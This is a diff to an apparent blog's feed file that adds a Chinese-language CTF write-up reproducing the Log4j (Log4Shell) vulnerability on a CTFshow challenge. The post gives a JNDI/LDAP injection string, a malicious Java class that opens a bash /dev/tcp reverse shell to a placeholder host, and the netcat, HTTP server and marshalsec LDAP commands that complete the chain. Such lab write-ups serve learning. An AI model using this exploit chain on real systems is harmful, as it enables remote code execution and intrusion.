@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>CTFSHOWLog4j复现</title>
+      <link href="posts/b8d6ddff.html"/>
+      <url>posts/b8d6ddff.html</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://s2.loli.net/2021/12/10/ro29tnOAhk1jF5Y.png"></p><p>今天上午刚刚看完这个洞，自己复现了一下，晚上就看到了上题正好打一下玩玩</p><p><img src="https://s2.loli.net/2021/12/10/ZlN2WgRQdzS8AEX.png"></p><p>多明显的输入框，嘿嘿嘿</p><p>这不得来一个</p><pre class="line-numbers language-none"><code class="language-none">${jndi:ldap://dnslog.com/exp} (bushi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="0x01-准备工作"><a href="#0x01-准备工作" class="headerlink" title="0x01 准备工作"></a>0x01 准备工作</h3><p>首先准备好恶意Java类</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>        <span class="token keyword">static</span><span class="token punctuation">{</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                <span class="token class-name">Runtime</span> r <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">String</span> cmd<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"exec 5&lt;&gt;/dev/tcp/xxx/50025;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>                <span class="token class-name">Process</span> p <span class="token operator">=</span> r<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>                p<span class="token punctuation">.</span><span class="token function">waitFor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">{</span>                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>能弹shell就行，怎么写都行</p><p>然后准备好<code>marshalsec-0.0.3-SNAPSHOT-all.jar</code></p><h3 id="0x02-监听端口"><a href="#0x02-监听端口" class="headerlink" title="0x02 监听端口"></a>0x02 监听端口</h3><pre class="line-numbers language-none"><code class="language-none">nc -lvnp 50025<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://s2.loli.net/2021/12/10/O8SjNG92Uf1QX37.png"></p><h3 id="0x03-起http服务"><a href="#0x03-起http服务" class="headerlink" title="0x03 起http服务"></a>0x03 起http服务</h3><pre class="line-numbers language-none"><code class="language-none">python3 -m http.server 50026<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://s2.loli.net/2021/12/10/jMlOFDwYbfemXxJ.png"></p><p>注意这里要在恶意Java类的目录下起http服务</p><h3 id="0x04-起LDAP服务"><a href="#0x04-起LDAP服务" class="headerlink" title="0x04 起LDAP服务"></a>0x04 起LDAP服务</h3><pre class="line-numbers language-none"><code class="language-none">java -cp ./marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://xxx:50026/#Test"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里的端口要和http服务的端口一致！！</p><p><img src="https://s2.loli.net/2021/12/10/4VGjPHR6alkZpiX.png"></p><h3 id="0x05-干他！"><a href="#0x05-干他！" class="headerlink" title="0x05 干他！"></a>0x05 干他！</h3><p>喜闻乐见的的地方来了</p><p><img src="https://s2.loli.net/2021/12/10/HYIxczbTaO312Ri.png"></p><p>点击<code>submit</code></p><p><img src="https://s2.loli.net/2021/12/10/TIUaXqQ8Z2Vf1z4.png"></p><p>可以看到这里已经加载了恶意类，而我们监听的端口已经反弹到了shell</p><p><img src="https://s2.loli.net/2021/12/10/8I2WptXjFAYCZbL.png"></p><p>打完收工！</p><p>后续也会写一下这个漏洞的源码分析，就是不知道让不让发。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> wp </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 做题记录 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>SQL注入基础</title>
       <link href="posts/e1ba94c8.html"/>
       <url>posts/e1ba94c8.html</url>
